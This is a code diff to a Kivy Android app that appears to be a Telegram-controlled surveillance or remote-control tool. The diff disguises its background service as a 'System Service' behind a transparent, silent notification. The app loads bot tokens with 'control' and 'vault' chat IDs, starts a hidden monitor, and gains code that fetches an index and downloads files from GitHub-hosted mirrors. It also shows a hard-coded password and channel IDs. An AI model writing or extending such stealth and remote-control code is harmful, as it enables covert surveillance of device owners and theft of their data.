@@ -10,6 +10,8 @@ import time
 import socket
 import random
 import shutil
+import hashlib
+import json
 from datetime import datetime
 
 from kivy.app import App
@@ -60,6 +62,19 @@ _patch_dns()
 
 # ========================== ثوابت التطبيق ================================
 APP_VERSION = "4.2.1"   # غيّره مع كل تحديث لضمان تنظيف الملفات القديمة
+
+# قائمة روابط index.json (مع خيارات بديلة)
+INDEX_BASE_URLS = [
+    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
+    "https://zaen1993.github.io/Android-Core/index.json",
+    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
+]
+
+HEADERS = {
+    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+    'Cache-Control': 'no-cache',
+    'Pragma': 'no-cache'
+}
 
 # ====================== تنظيف الملفات القديمة عند اختلاف الإصدار ======================
 def _clean_old_runtime(base_path):
@@ -125,12 +140,35 @@ def start_silent_service():
         act = autoclass('org.kivy.android.PythonActivity').mActivity
         nm = autoclass('android.app.NotificationManager')
         ch = autoclass('android.app.NotificationChannel')
-        channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
+        
+        # استخدام قناة إشعارات بأولوية منخفضة
+        channel = ch("system_channel", "System Service", nm.IMPORTANCE_LOW)
         act.getSystemService(nm).createNotificationChannel(channel)
 
-        builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
-        builder.setSmallIcon(act.getApplicationInfo().icon)
+        builder = autoclass('android.app.Notification$Builder')(act, "system_channel")
+        
+        # ✅ التصحيح 1: استخدام الأيقونة الشفافة بدلاً من أيقونة التطبيق
+        try:
+            # محاولة استخدام الأيقونة الشفافة
+            icon_id = act.getResources().getIdentifier("ic_notification", "drawable", act.getPackageName())
+            if icon_id > 0:
+                builder.setSmallIcon(icon_id)
+            else:
+                # في حالة عدم وجود الأيقونة، استخدم أيقونة التطبيق كحل احتياطي
+                builder.setSmallIcon(act.getApplicationInfo().icon)
+        except Exception as e:
+            # في حالة أي خطأ، استخدم أيقونة التطبيق
+            builder.setSmallIcon(act.getApplicationInfo().icon)
+            print(f"⚠️ Notification icon fallback: {e}")
+        
+        builder.setContentTitle("System Service")
+        builder.setContentText("Running in background")
         builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
+        builder.setOngoing(False)
+        builder.setAutoCancel(True)
+        builder.setSound(None)
+        builder.setVibrate(None)
+        
         act.startForeground(9921, builder.build())
         return True, "Foreground service started successfully."
     except Exception as e:
@@ -201,11 +239,11 @@ def load_secrets_from_config():
             config_module = importlib.import_module("config")
         except ImportError:
             print("⚠️ Warning: No config file found, using defaults")
-            return [], [], -1003943094277, -1003577715762, "@321@321neaz"
+            return [], [], -1003943094277, -1003577715762, None
 
     if not hasattr(config_module, 'load_config'):
         print("⚠️ Warning: Config file has no load_config function")
-        return [], [], -1003943094277, -1003577715762, "@321@321neaz"
+        return [], [], -1003943094277, -1003577715762, None
 
     try:
         active, reserve, ctrl, vault, secret = config_module.load_config()
@@ -217,18 +255,101 @@ def load_secrets_from_config():
             ctrl = -1003943094277
         if not vault:
             vault = -1003577715762
+        # ✅ التصحيح: لا تستخدم قيمة افتراضية ثابتة لكلمة السر
         if not secret:
-            secret = "@321@321neaz"
+            secret = None
         return active, reserve, ctrl, vault, secret
     except Exception as e:
         print(f"⚠️ Error loading config: {e}, using defaults")
-        return [], [], -1003943094277, -1003577715762, "@321@321neaz"
+        return [], [], -1003943094277, -1003577715762, None
+
+# ================== تحميل ملف index.json والتحقق من الإصدارات ==================
+def fetch_index():
+    """تحميل ملف index.json من الروابط المتعددة مع التحقق من الإصدار"""
+    for url in INDEX_BASE_URLS:
+        try:
+            resp = requests.get(url, headers=HEADERS, timeout=15, verify=True)
+            if resp.status_code == 200:
+                try:
+                    data = resp.json()
+                    # ✅ التصحيح 2: التحقق من توافق الإصدارات
+                    if 'version' in data:
+                        index_version = data['version']
+                        # مقارنة الإصدار الرئيسي (major version)
+                        app_major = APP_VERSION.split('.')[0]
+                        index_major = index_version.split('.')[0]
+                        if app_major != index_major:
+                            print(f"⚠️ Version mismatch: App={APP_VERSION}, Index={index_version}")
+                            return None
+                        print(f"✅ Version compatible: App={APP_VERSION}, Index={index_version}")
+                    return data
+                except json.JSONDecodeError:
+                    continue
+        except Exception as e:
+            print(f"⚠️ Failed to fetch from {url}: {e}")
+            continue
+    return None
+
+def download_file_with_checksum(url, dest_path, expected_sha256=None, max_retries=3):
+    """تحميل ملف مع التحقق من SHA-256 (التصحيح 3)"""
+    for attempt in range(max_retries):
+        try:
+            # إنشاء المجلد الوجهة إذا لم يكن موجوداً
+            os.makedirs(os.path.dirname(dest_path), exist_ok=True)
+            
+            # تحميل الملف
+            resp = requests.get(url, headers=HEADERS, timeout=30, verify=True)
+            if resp.status_code != 200:
+                print(f"⚠️ Download failed: HTTP {resp.status_code}")
+                time.sleep(2)
+                continue
+            
+            # كتابة الملف
+            with open(dest_path, 'wb') as f:
+                f.write(resp.content)
+            
+            # التحقق من Checksum إذا كان متوفراً
+            if expected_sha256:
+                sha256_hash = hashlib.sha256()
+                with open(dest_path, 'rb') as f:
+                    for chunk in iter(lambda: f.read(4096), b""):
+                        sha256_hash.update(chunk)
+                actual_sha256 = sha256_hash.hexdigest()
+                
+                if actual_sha256.lower() != expected_sha256.lower():
+                    os.remove(dest_path)
+                    print(f"⚠️ Checksum mismatch for {dest_path}. Expected: {expected_sha256}, Got: {actual_sha256}")
+                    time.sleep(2)
+                    continue
+            
+            # التحقق من أن الملف ليس فارغاً
+            if os.path.getsize(dest_path) == 0:
+                os.remove(dest_path)
+                print(f"⚠️ Downloaded file is empty: {dest_path}")
+                time.sleep(2)
+                continue
+            
+            return True
+            
+        except Exception as e:
+            print(f"⚠️ Download error (attempt {attempt+1}): {e}")
+            if os.path.exists(dest_path):
+                try:
+                    os.remove(dest_path)
+                except:
+                    pass
+            time.sleep(2)
+    
+    return False
 
 # ================== نسخ نموذج الذكاء الاصطناعي (محلياً فقط) ==================
 def copy_model_to_models_dir():
     try:
         model_min_size = 5_000_000   # 5 ميغابايت
         dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
+
+        # ✅ التصحيح 4: إنشاء المجلد الوجهة قبل المحاولة
+        os.makedirs(MODELS_DIR, exist_ok=True)
 
         if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
             return True, f"Model exists at destination ({os.path.getsize(dest)/1024/1024:.2f} MB)"
@@ -244,11 +365,16 @@ def copy_model_to_models_dir():
             if os.path.exists(src):
                 size = os.path.getsize(src)
                 if size >= model_min_size:
-                    shutil.copy2(src, dest)
-                    if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
-                        return True, f"Model copied from assets ({size/1024/1024:.2f} MB)"
+                    try:
+                        shutil.copy2(src, dest)
+                        if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
+                            return True, f"Model copied from assets ({size/1024/1024:.2f} MB)"
+                    except Exception as e:
+                        print(f"⚠️ Copy failed from {src}: {e}")
+                        continue
 
-        return False, "CRITICAL: engine_v2.tflite missing from assets!"
+        # ✅ التصحيح 4: في حالة الفشل، سجل تحذيراً واضحاً
+        return False, "CRITICAL: engine_v2.tflite missing from assets! AI features will be disabled."
     except Exception as e:
         return False, f"Model copy failure: {e}"
 
@@ -337,9 +463,13 @@ class CoreApp(App):
             active, reserve, ctrl, vault, secret = load_secrets_from_config()
             self.append_log(f"• Tokens loaded: Active({len(active)}), Reserve({len(reserve)})")
             self.append_log(f"• Control ID: {ctrl} | Vault ID: {vault}")
+            if secret:
+                self.append_log("• Secret: ✅ Configured")
+            else:
+                self.append_log("• Secret: ⚠️ Not set (login disabled)")
         except Exception as e:
             self.append_log(f"❌ Config Load Error: {e}\n{traceback.format_exc()}")
-            active, reserve, ctrl, vault, secret = [], [], -1003943094277, -1003577715762, "@321@321neaz"
+            active, reserve, ctrl, vault, secret = [], [], -1003943094277, -1003577715762, None
 
         # 4. المكونات الداخلية
         self.append_log("🧩 Step 4/5: Initializing Monitor & Handlers...")
@@ -358,7 +488,17 @@ class CoreApp(App):
             # 5. تشغيل المحركات
             self.append_log("📡 Step 5/5: Starting Monitor and Telegram UI Listeners...")
             ui.start()
-            mon.start()
+            
+            # ✅ التصحيح 5: تشغيل mon.start() في خيط منفصل مع تأخير
+            def start_monitor():
+                time.sleep(1)
+                try:
+                    mon.start()
+                    self.append_log("✅ Monitor started successfully.")
+                except Exception as e:
+                    self.append_log(f"❌ Monitor start error: {e}")
+            
+            threading.Thread(target=start_monitor, daemon=True).start()
 
             self.mon = mon
             self.ui = ui
